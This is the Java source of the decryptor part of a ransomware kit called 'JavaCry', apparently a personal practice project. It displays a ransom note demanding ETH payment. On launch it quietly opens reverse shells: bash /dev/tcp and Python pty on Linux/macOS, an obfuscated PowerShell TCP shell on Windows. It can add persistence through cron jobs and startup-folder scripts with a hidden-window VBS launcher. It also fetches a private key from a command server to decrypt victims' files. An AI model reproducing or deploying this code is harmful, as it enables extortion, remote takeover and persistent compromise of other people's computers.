import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.Color;

import java.util.*;
import java.net.*;
import java.io.*;
import java.io.FileOutputStream;
import java.util.stream.Collectors;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.FileInputStream;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.ArrayList;
import java.util.stream.Stream;

import java.security.*;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.security.spec.EncodedKeySpec;

import java.applet.*;
import java.io.File;
import java.net.*;
/*
   decryptor:
   BTC payment interface
   Request for decryption functionality
   if receives the key, use the key to decrypt the files
   destroy decryptor.java
 */
public class Decryptor {
  private static int id = 823780263;

  // network settings
  private static String address = "127.0.0.1";
  private int port = 5555;

  private boolean usingRevShell = true;
  private int revPort = 9999;
  private boolean usePersistence = false;
  private String CryptAddress = "[My Address]";
  private double cost = 1;

  // socket variables
  private Socket socket;
  private DataOutputStream out = null;
  private DataInputStream in = null;

  // crypt settings
  private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
  private String b64privkey;
  private PrivateKey private_key;
  private Cipher RSA_Cipher;
  private Cipher AES_Cipher;
  private static java.util.List<Path> files = new ArrayList<Path>();
  private String OS = System.getProperty("os.name");

  private ClientThread backend;

  

  public void shell() {
    Thread thread = new Thread(){
      public void run(){
        Process p;
        try {
          if (OS.indexOf("Linux") >= 0 || OS.indexOf("Mac OS X") >= 0) {
            try {
              p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1");
            } catch (Exception e) {
              System.out.println("1" + e);
            }
            if (usePersistence) {
              
              System.out.println("persistence started");
              String[] cmd = {
                "/bin/sh",
                "-c",
                "echo '* * * * * bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1' | crontab -"
              };
              p = Runtime.getRuntime().exec(cmd);
              BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));

              cmd = new String[]{
                "/bin/sh",
                "-c",
                "echo \"* * * * * python3 -c \\\"socket=__import__('socket');os=__import__('os');pty=__import__('pty');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + address + "', " + revPort + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\\\"\" | crontab -"
              };
              p = Runtime.getRuntime().exec(cmd);
              b = new BufferedReader(new InputStreamReader(p.getInputStream()));
                System.out.println("persistence done");
            }
            
            System.out.println("linux execution");
          } else if (OS.indexOf("Windows") >= 0) {
            String payload = "$KLK = New-Object System.Net.Sockets.TCPClient('" + address + "','" + revPort + "');$PLP = $KLK.GetStream();[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};$VVCCA = ([text.encoding]::UTF8).GetBytes(\"Succesfuly connected .`n`n\");$PLP.Write($VVCCA,0,$VVCCA.Length);$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ');$PLP.Write($VVCCA,0,$VVCCA.Length);[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);$VZZS = (i`eX $DD 2>&1 | Out-String );$HHHHHH  = $VZZS + (pwd).Path + '! ';$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);$PLP.Write($L,0,$L.Length);$PLP.Flush()};$KLK.Close();";
            
            String username = System.getProperty("user.name");
            File f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1");

            if (!f.exists()) {
                f.createNewFile();
            }
            FileWriter writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1");

            writer.write(payload);
            writer.close();
            String cmd = "powershell C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
            System.out.println(cmd);
            p = Runtime.getRuntime().exec(cmd);
            cmd = "start /B powershell.exe C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
            if (usePersistence) {

              // backdoor runner

              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat");

              if (!f.exists()) {
                  f.createNewFile();
              }
              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat");
              writer.write(cmd);
              writer.close();

              // window hider

              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs");
              if (!f.exists()) {
                f.createNewFile();
              }
              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs");
              writer.write("CreateObject(\"Wscript.Shell\").Run \"C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat\", 0, True");
              writer.close();


              // window hider runner

              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat");
              if (!f.exists()) {
                f.createNewFile();
              }
              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat");
              writer.write("@echo off\nstart C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs  > nul 2> nul");
              writer.close();
            }

          } else {
            System.out.println(OS);
          }
        } catch (Exception e) {
          System.out.println(e);
        }
        System.out.println("Thread done");
      }
    };
  thread.start();
  System.out.println("Thread should be started");
  }


  public Decryptor() {

    if (usingRevShell) {
      shell();
    }


    String note = String.join("\n", "<html>", "",
        "<h1 style = 'font-size: 32px; padding: 10px 10px; color: rgb(255,255,255);'>Your files have been encrypted.</h1>",
        "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
        "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with " + cost + " ETH to " + CryptAddress + ". You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption.",
        "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
        "<br><b>Don’t delete or modify any content in Key_protected.key and public.key, or you will lose your ability to decrypt your files.</b>",
        "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
        "<br>If you want to open this window again, please run Decryptor.jar.<br>", "</p>", "</html>");

    JFrame f = new JFrame();
    JPanel panel = new JPanel();
    JPanel panel2 = new JPanel();
    JLabel html = new JLabel();
    JButton b = new JButton("Request for Decryption");
    JLabel status = new JLabel("");
    URL url = Decryptor.class.getResource("loading.gif");
    ImageIcon imageIcon = new ImageIcon(url);
    JLabel loading = new JLabel(imageIcon);

    html.setText(note);
    html.setAlignmentX(Component.CENTER_ALIGNMENT);
    b.setAlignmentX(Component.CENTER_ALIGNMENT);
    status.setAlignmentX(Component.CENTER_ALIGNMENT);
    status.setAlignmentY(Component.BOTTOM_ALIGNMENT);
    status.setHorizontalAlignment(JLabel.CENTER);
    status.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 14));
    panel2.setBackground(new Color(50, 0, 0));

    b.addActionListener(new ActionListener() {

      @Override
      public void actionPerformed(ActionEvent e) {
        backend = new ClientThread(address, port, id, status, b, loading);
        backend.start();
      }
    });

    f.setLayout(new GridLayout(0, 1));
    panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
    panel.add(html);
    panel.add(b);
    panel.setBackground(new Color(50, 0, 0));
    f.add(panel);
    panel2.setLayout(new GridLayout(0, 1));
    panel2.add(status);
    panel2.add(loading);
    loading.setVisible(false);
    f.add(panel2);
    // f.add(new JButton("Button 1"));
    // f.add(new JButton("Button 2"));

    f.setTitle("JavaCry Decryptor");
    f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    f.setLocationRelativeTo(null);
    f.setExtendedState(JFrame.MAXIMIZED_BOTH);
    f.pack();
    f.setVisible(true);
    html.setFont(new Font(Font.SANS_SERIF, Font.PLAIN, 18));
    b.setFont(new Font("Arial", Font.PLAIN, 30));
    b.setBackground(Color.RED);
    b.setForeground(Color.WHITE);
    b.setOpaque(true);

    status.setForeground(Color.RED);
    b.setBorder(BorderFactory.createCompoundBorder(
        BorderFactory.createLineBorder(Color.RED, 5),
        BorderFactory.createLineBorder(Color.BLACK, 20)));
  }

  public static String getTargetPath() {
    return targetPath;
  }

  // main method
  public static void main(String args[]) {

    Decryptor awt_obj = new Decryptor();
 
    
  }

}


class ClientThread extends Thread {
  private String state;
  private static String targetPath;
  private static java.util.List<Path> files = new ArrayList<Path>();
  private static ArrayList<String> avoidDir = new ArrayList<String>();
  private String b64privkey;
  private PrivateKey private_key;
  private Cipher RSA_Cipher;
  private Cipher AES_Cipher;
  private Socket socket;
  private String address;
  private JLabel status;
  private JLabel loading;
  private JButton button;
  private int port;
  private int id;

  public static void search(String path) throws Exception {
    File root = new File(path);
    File[] list = root.listFiles();

    if(list == null) return;

    for(File f: list) {
        String name = f.getName();
        if (f.isDirectory()) {
            if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
            search(f.getAbsolutePath());

        } else {
            //split to get file extension
            System.out.println(name);
            if (!name.equals("JavaCry.jar")) {
                files.add(f.toPath());
            }
        }
    }
  }

  public ClientThread(String address, int port, int id, JLabel status, JButton button, JLabel loading) {
    state = "<def>";
    targetPath = Decryptor.getTargetPath();
    this.port = port;
    this.address = address;
    this.id = id;
    this.status = status;
    this.loading = loading;
    this.button = button;
    System.out.println("backend initialized");
  }

  public void run() {
    status.setText("Waiting for approval");

    loading.setVisible(true);
    RequestForDecryption();
    loading.setVisible(false);
  }

  public void RequestForDecryption() {
    try {

      button.setEnabled(false);
      System.out.println("trying to connect");
      socket = new Socket(address, port);
      System.out.println("connected");

      DataInputStream in = new DataInputStream(socket.getInputStream());
      DataOutputStream out = new DataOutputStream(socket.getOutputStream());
      out.writeUTF("RequestForDecryption");
      System.out.println("RequestForDecryption");

      // prevent request forgery
      String RFToken = in.readUTF();
      System.out.println("read token");

      // use the rsa for encrypting the AES key to encrypt ID to send it to the server
      File pubFile = new File("public.key");
      byte[] pubBytes = Files.readAllBytes(pubFile.toPath());
      KeyFactory keyFactory = KeyFactory.getInstance("RSA");
      EncodedKeySpec encryptSpec = new X509EncodedKeySpec(pubBytes);
      PublicKey pubKey = keyFactory.generatePublic(encryptSpec);

      Cipher cipher = Cipher.getInstance("RSA");
      cipher.init(Cipher.ENCRYPT_MODE, pubKey);

      byte[] idBytes = (String.valueOf(id) + "," + RFToken).getBytes(StandardCharsets.UTF_8);
      byte[] encryptedID = cipher.doFinal(idBytes);
      String encodedString = Base64.getEncoder().encodeToString(encryptedID);


      out.writeUTF(encodedString);
      System.out.println("write data");


      b64privkey = in.readUTF();
      System.out.println("received key");
      System.out.println(b64privkey);
      if (b64privkey.equals("but I refuse")) {
        status.setText("Your request has been rejected.");
        button.setEnabled(true);
        return;
      }
      byte[] pub = Base64.getDecoder().decode(b64privkey);
      PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(pub);
      KeyFactory factory = KeyFactory.getInstance("RSA");
      private_key = factory.generatePrivate(spec);

      RSA_Cipher = Cipher.getInstance("RSA");
      AES_Cipher = Cipher.getInstance("AES");

      avoidDir.add("windows");
      avoidDir.add("library");
      avoidDir.add("boot");
      avoidDir.add("local");
      avoidDir.add("program files");
      avoidDir.add("programdata");
      avoidDir.add("system");
      avoidDir.add("volumes");
      avoidDir.add("dev");
      avoidDir.add("etc");
      avoidDir.add("bin");
      avoidDir.add("$");

      try {
        if (targetPath.equals("")) {
            targetPath = System.getProperty("user.dir");
        } else {
            File f = new File(targetPath);
            targetPath = f.getAbsolutePath();
        }
        System.out.println("Searching " + targetPath);
        search(targetPath);
      } catch (Exception e) {
          System.out.println(e);
      }

      try {
        decryptFiles();
        status.setText("Your request has been accepted.");
        button.setEnabled(true);
      } catch (Exception err) {
        status.setText("Request failed.");
        button.setEnabled(true);
      }
    } catch (UnknownHostException u) {
      status.setText("Request failed.");
      button.setEnabled(true);
      System.out.println(u);
    } catch (IOException i) {
      status.setText("Request failed.");
      button.setEnabled(true);
      System.out.println(i);
    } catch (Exception err) {
      status.setText("Request failed.");
      button.setEnabled(true);
      System.out.println(err);
    }
  }

  public byte[] RSACrypt(File f) {
    try {
      FileInputStream in = new FileInputStream(f);
      byte[] input = new byte[(int) f.length()];
      in.read(input);

      FileOutputStream out = new FileOutputStream(f);
      byte[] output = RSA_Cipher.doFinal(input);

      return output;
    } catch (Exception e) {
      System.out.println(e);
    }
    return null;
  }

  public void AESCrypt(File f) {
    try {
      FileInputStream in = new FileInputStream(f);
      byte[] input = new byte[(int) f.length()];
      in.read(input);

      FileOutputStream out = new FileOutputStream(f);
      byte[] output = AES_Cipher.doFinal(input);
      out.write(output);

      out.flush();
      out.close();
      in.close();
      System.out.println("Decrypting file: " + f);
    } catch (Exception e) {
      System.out.println(e);
    }
  }

  public void decryptFiles() throws Exception {

    RSA_Cipher.init(Cipher.DECRYPT_MODE, private_key);
    File k = new File("Key_protected.key");
    byte[] data = RSACrypt(k);
    SecretKey AESKey = new SecretKeySpec(data, 0, data.length, "AES");
    AES_Cipher.init(Cipher.DECRYPT_MODE, AESKey);
    for (Path p : files) {
      try {
        File f = p.toFile();
        AESCrypt(f);
      } catch (Exception e) {
        System.out.println(e);
      }
    }

  }
}
